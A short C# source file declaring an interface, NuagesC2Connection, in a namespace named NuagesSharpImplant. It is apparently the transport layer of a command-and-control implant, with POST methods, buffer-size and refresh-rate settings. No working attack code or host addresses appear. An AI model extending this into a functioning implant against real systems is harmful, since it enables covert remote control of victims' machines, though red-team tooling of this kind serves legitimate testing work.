namespace NuagesSharpImplant
{
    public interface NuagesC2Connection
    {
        string POST(string url, string jsonContent);

        byte[] POST(string url, byte[] body);

        string getConnectionString();

        string getHandler();

        int getBufferSize();

        int getRefreshRate();

        bool supportsBinaryIO();

        void setRefreshRate(int refreshrate);

        void setBufferSize(int buffersize);

    }
}
